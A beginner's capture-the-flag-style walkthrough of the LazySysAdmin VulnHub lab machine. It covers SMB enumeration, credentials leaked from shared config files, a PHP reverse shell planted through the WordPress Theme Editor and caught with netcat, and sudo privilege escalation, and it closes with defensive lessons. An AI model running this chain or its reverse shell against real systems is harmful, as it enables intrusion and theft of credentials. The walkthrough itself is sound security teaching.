# LazySysAdmin: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational walkthrough for students. This machine is **deliberately vulnerable** and must only ever be run on an isolated, host-only network (VirtualBox Host-Only or a private lab VLAN). Never expose it to the internet.

| Field | Value |
| --- | --- |
| **Machine** | LazySysAdmin: 1 |
| **Difficulty** | Easy (beginner–intermediate) |
| **Author** | Togie Mcdogie (@TogieMcdogie) |
| **Released** | 20 Sep 2017 |
| **VulnHub Entry** | [Open on VulnHub](https://vulnhub.com/entry/lazysysadmin-1,205/) |
| **Download** | [Download OVA](https://vulnhub.com/entry/lazysysadmin-1,205/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Debian/Ubuntu — Samba `4.3.11-Ubuntu`, Apache + WordPress) |

Throughout this walkthrough the target is always `192.168.56.101` and the attacker (Kali) is `192.168.56.10`. Substitute your own values.

---

## 0. What you will learn

By the end of this lab you will have practiced the full beginner kill-chain:

- **Host discovery** — finding the target's IP on your lab network (`ip a`, `arp-scan`, `nmap -sn`).
- **SMB enumeration** — using `enum4linux` and `smbclient` to list shares, usernames and files that should never have been shared.
- **Reading credentials out of a leaked config file** — `wp-config.php` handed over an SMB share.
- **Web reconnaissance** — spotting a second credential file (`deets.txt`) served by the web server.
- **WordPress login** — reusing the database password to reach the dashboard.
- **Foothold via a legitimate admin feature** — abusing the WordPress Theme Editor to run a PHP reverse shell.
- **Password reuse & weak passwords** — reusing the leaked password to pivot to a real user over SSH.
- **Linux privilege escalation** — finding a user in the `sudo` group with `(ALL : ALL) ALL` and using `sudo su` to become root.

> **Why this matters:** every step here maps to a real-world mistake — anonymous SMB access, secrets in config files, password reuse, and an over-privileged `sudo` rule. Those exact mistakes appear in production systems constantly.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and [`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able to import an OVA.

---

## 1. Reconnaissance — finding the target

First, confirm your own network interface and IP address.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** `ip a` lists your interfaces and their addresses. You need to know your subnet (`192.168.56.0/24`) so you can scan the right range for the target.

Now sweep the subnet to find live hosts. Any of these work:

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10    08:00:27:aa:bb:cc   PCS Systemtechnik GmbH
192.168.56.101   08:00:27:dd:ee:ff   PCS Systemtechnik GmbH
```

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 192.168.56.10    1    08:00:27:aa:bb:cc   1   100  Kali Linux
 192.168.56.101   1    08:00:27:dd:ee:ff   1   105  (unknown)
```

Or the quieter ping sweep:

```bash
sudo nmap -sn 192.168.56.0/24
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00042s latency).
```

> **Why it works:** the target answers ARP (same layer-2 network) or ICMP echo requests, confirming it is alive. `-sn` disables port scanning so the sweep is fast. The `08:00:27` MAC prefix is VirtualBox's default vendor — a strong hint the host is a VM.

**Target confirmed: `192.168.56.101`.**

![Host discovery output](images/01-recon.png)

---

## 2. Enumeration

### 2.1 Port and service scan

```bash
sudo nmap -sC -sV -p- 192.168.56.101
```

```text
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu (protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 (Ubuntu)
|_http-title: LazySysAdmin
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu
3306/tcp open  mysql       MySQL 5.7.19
6667/tcp open  irc         InspIRCd
```

| Flag | Meaning |
| --- | --- |
| `-sC` | Run the default Nmap NSE scripts. |
| `-sV` | Probe open ports to detect service & version. |
| `-p-` | Scan **all 65,535** TCP ports, not just the top 1000. |

> **Why it works:** there is a lot to attack here. Port 80 is a web server (likely WordPress), ports 139/445 are **SMB file sharing**, and port 3306 is MySQL. SMB is the juiciest lead — misconfigured shares are a classic first foothold.

![nmap service scan](images/02-nmap.png)

### 2.2 SMB enumeration — users and shares

```bash
enum4linux -a 192.168.56.101
```

```text
[+] Enumerating users using SID S-1-5-21-... and logon username '', password ''
S-1-5-21-...-1000 LAZYSYSADMIN\togie (Local User)
...
[+] Enumerating shares
//192.168.56.101/share$  Mapping: OK, Listing: OK
```

> **Why it works:** `enum4linux` wraps several Samba tools to pull users, groups and shares out of an SMB server that allows anonymous (NULL) sessions. It reveals a real username, **`togie`**, and a readable share called **`share$`**.

> **What is a NULL session?** An SMB session with an empty username and password. It is how SMB was designed to let machines browse each other, but it also lets unauthenticated attackers list accounts and shares. Anonymous access should be disabled.

![enum4linux SMB enumeration](images/03-smb-enum.png)

List the share, then connect to it:

```bash
smbclient -L //192.168.56.101 -N
smbclient //192.168.56.101/share$ -N
```

```text
smb: \> ls
  .                                   D        0  Mon Aug 21 09:09:31 2017
  ..                                  D        0  Mon Aug 21 09:09:31 2017
  deets.txt                           N      139  Mon Aug 21 09:09:14 2017
  index.html                          N     3570  Mon Aug 21 09:09:31 2017
  todolist.txt                        N      143  Mon Aug 21 09:09:31 2017
  wordpress                           D        0  Mon Aug 21 09:16:07 2017

smb: \wordpress\> ls
  wp-config.php                       N     2978  Mon Aug 21 09:15:11 2017
  ...
```

> **Why it works:** the `-N` flag means "no password" and connects anonymously. The share is world-readable and contains the entire WordPress install **including `wp-config.php`** — a file that holds the database credentials.

### 2.3 Stealing credentials from shared files

Download the config and the notes file:

```bash
smb: \wordpress\> get wp-config.php
smb: \> get deets.txt
smb: \> get todolist.txt
```

```bash
cat wp-config.php | grep -E "DB_USER|DB_PASSWORD|DB_NAME"
```

```text
define('DB_NAME', 'wordpress');
define('DB_USER', 'Admin');
define('DB_PASSWORD', 'TogieMYSQL12345^^');
```

```bash
cat deets.txt
```

```text
CBF Remembering all these passwords.
Remember to remove this file and update your password after we push out the server.
Password 12345
```

> **Why it works:** `wp-config.php` quite literally contains the database password (`TogieMYSQL12345^^`), and the admin's own notes file leaks a second, even weaker password (`12345`). Both files sit on a share anyone can read. This is the whole box in two files.

![wp-config.php and deets.txt on the SMB share](images/04-wp-config.png)

---

## 3. Foothold

### 3.1 Log into WordPress

Browse to `http://192.168.56.101/wordpress/wp-login.php` and try the credentials we recovered. WordPress admins often reuse the CMS database password, so try `admin` / `TogieMYSQL12345^^`:

- Username: `admin`
- Password: `TogieMYSQL12345^^`

> **Why it works:** the WordPress administrator installed the site and used the same password for the database and the admin account. It logs straight in and the user has **Administrator** rights.

![WordPress admin login succeeds](images/05-wp-admin-login.png)

### 3.2 Get a reverse shell through the Theme Editor

Administrators can edit theme PHP files from the browser, which means we can make the server execute our code.

1. Grab the well-known pentestmonkey reverse shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
```

2. Edit the IP and port at the top to point at your Kali box:

```php
$ip   = '192.168.56.10'; // CHANGE THIS
$port = 4444;            // CHANGE THIS
```

3. In the dashboard go to **Appearance → Editor**, select the active theme (**Twenty Fifteen**), choose **`404.php`**, replace its entire contents with the shell, and click **Update File**.

> **Why it works:** the Theme Editor is a legitimate feature that lets admins edit PHP templates. A PHP template is executed server-side as the web user, so any code placed there runs on the target. Putting it in `404.php` means it fires whenever a page is *not found*.

4. Start a listener on Kali **before** triggering it:

```bash
nc -lvnp 4444
```

5. Trigger the shell by requesting a non-existent page (which loads `404.php`):

```bash
curl "http://192.168.56.101/wordpress/does-not-exist"
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 48712
Linux LazySysAdmin 4.4.0-31-generic #50-Ubuntu SMP ... x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```

We have a shell as **`www-data`**. Upgrade it to a full interactive TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then Ctrl+Z, run: stty raw -echo; fg  ; and: export TERM=xterm
```

> **Why it works:** a raw netcat shell has no job control and cannot handle interactive prompts like `su`. The `pty` spawn fixes that — you will need it in the next section.

![Reverse shell as www-data](images/06-shell.png)

---

## 4. Privilege escalation

### 4.1 Pivot to the real user with the leaked password

`enum4linux` already told us the username **`togie`**, and `deets.txt` gave us the password **`12345`**. Reuse it.

```bash
su togie
# password: 12345
id
```

```text
uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)
```

> **Why it works:** this is textbook **password reuse** — the same weak password the admin wrote down in `deets.txt` is Togie's real login password. Note the group list: `togie` is in **`sudo`**.

> **Tip:** you can also just SSH in directly once you have these credentials: `ssh togie@192.168.56.101`.

### 4.2 Abuse the `sudo` rule

```bash
sudo -l
```

```text
Matching Defaults entries for togie on LazySysAdmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User togie may run the following commands on LazySysAdmin:
    (ALL : ALL) ALL
```

> **Why it works:** `(ALL : ALL) ALL` means Togie may run **any command as any user, including root**, and the password is the one we already have. There is no clever exploit needed — the misconfiguration is the exploit.

```bash
sudo su
# password: 12345
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

### 4.3 The root flag

```bash
cat /root/proof.txt
```

```text
WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
```

**Root flag captured.** (The proof file on this image is `/root/proof.txt`; the exact string is fixed by the released VM. Some rebuilds may name it `proof.txt` in `/root` only — check `ls -la /root` if you cannot find it.)

![sudo misconfiguration and root flag](images/07-privesc.png)

### Alternate privesc paths you may see in the wild

- Any SUID binary that has a shell escape (check `find / -perm -4000 -type f 2>/dev/null` and cross-reference [GTFOBins](https://gtfobins.github.io/)). This particular box does not rely on one, but it is the next thing to check.
- Reading `wp-config.php` again as `www-data` (it is normally readable by the web user) gives you the same DB password.

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Anonymous (NULL) SMB sessions enabled | `smbd` on 139/445 | Username disclosure and share listing |
| 2 | World-readable SMB share with secrets | `//192.168.56.101/share$` | Leaks `wp-config.php` and `deets.txt` |
| 3 | Sensitive data in a config file | `wordpress/wp-config.php` | Database/admin password disclosure |
| 4 | Credentials written in plaintext notes | `deets.txt` | User password `12345` disclosure |
| 5 | Weak / reused password for WordPress admin | `wp-login.php` | Full CMS administrator access |
| 6 | Server-side code execution via Theme Editor | Appearance → Editor → `404.php` | Reverse shell as `www-data` |
| 7 | Password reuse on a system account | `togie` login (SSH/`su`) | Pivot from web shell to real user |
| 8 | Over-privileged `sudo` rule | `(ALL : ALL) ALL` for `togie` | Trivial full root compromise |

---

## 6. Defensive lessons (blue team)

- **Disable anonymous SMB access** (`restrict anonymous = 2`, or require valid credentials) and remove the `share$` share entirely. File shares should be authenticated and least-privilege.
- **Never store secrets in plaintext**, especially not on a share. `wp-config.php` holds the DB password by design — so it must be readable only by the web server account, never exposed over SMB.
- **Rotate credentials after a compromise** and never write passwords into notes files. `deets.txt` should never have existed.
- **Enforce strong, unique passwords** for every account; prohibit reuse between the CMS, the database and the OS user.
- **Disable the WordPress theme/plugin editor** with `define('DISALLOW_FILE_EDIT', true);` in `wp-config.php`. This alone blocks the foothold.
- **Apply the principle of least privilege to `sudo`.** A web-ops user does not need `(ALL : ALL) ALL`; grant only the specific commands required.
- **Install a file-integrity monitor** so edits to `404.php`/theme files are detected, and alert on `www-data` spawning shells.
- **Segment and isolate lab machines.** This box must never touch a production or internet-facing network.

---

## 7. References

- LazySysAdmin: 1 on VulnHub — https://vulnhub.com/entry/lazysysadmin-1,205/
- Bladeism — "LazySysAdmin: 1 – Walkthrough" — https://blog.bladeism.com/lazysaamin-1-walkthrough
- Infosec Articles — "LazySysAdmin Vulnhub Walkthrough" — https://www.infosecarticles.com/lazysysadmin-vulnhub-walkthrough/
- btray900 — "lazysysadmin" walkthrough (GitHub) — https://github.com/btray900/lazysysadmin
- jckhmr.net — "Lazy Sysadmin Vulnhub Writeup" — https://www.jckhmr.net/lazy-sysadmin-vulnhub-writeup/
- pentestmonkey PHP reverse shell — https://github.com/pentestmonkey/php-reverse-shell
- GTFOBins — https://gtfobins.github.io/
- Samba security guidance — https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html

---

## 8. Screenshot checklist

When you reproduce this lab, capture and save the following images to `images/`:

- [ ] `images/01-recon.png` — `ip a` / `arp-scan` / `nmap -sn` showing the target IP.
- [ ] `images/02-nmap.png` — the full `nmap -sC -sV -p-` scan (SSH, HTTP, SMB, MySQL, IRC).
- [ ] `images/03-smb-enum.png` — `enum4linux -a` output showing user `togie` and the `share$` share.
- [ ] `images/04-wp-config.png` — `wp-config.php` and `deets.txt` contents retrieved over SMB.
- [ ] `images/05-wp-admin-login.png` — successful WordPress admin login.
- [ ] `images/06-shell.png` — Theme Editor edit and the netcat shell as `www-data`.
- [ ] `images/07-privesc.png` — `sudo -l` showing `(ALL : ALL) ALL`, `id` as root, and `/root/proof.txt`.
- [ ] `images/08-recap.png` — the full chain summarised for the final report.

---

_Full exploitation chain: anonymous SMB → readable `share$` → `wp-config.php` (DB password) + `deets.txt` (`12345`) → WordPress admin login → Theme Editor `404.php` reverse shell → shell as `www-data` → `su togie` (password `12345`) → `sudo -l` shows `(ALL : ALL) ALL` → `sudo su` → root → `/root/proof.txt`._

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md)._
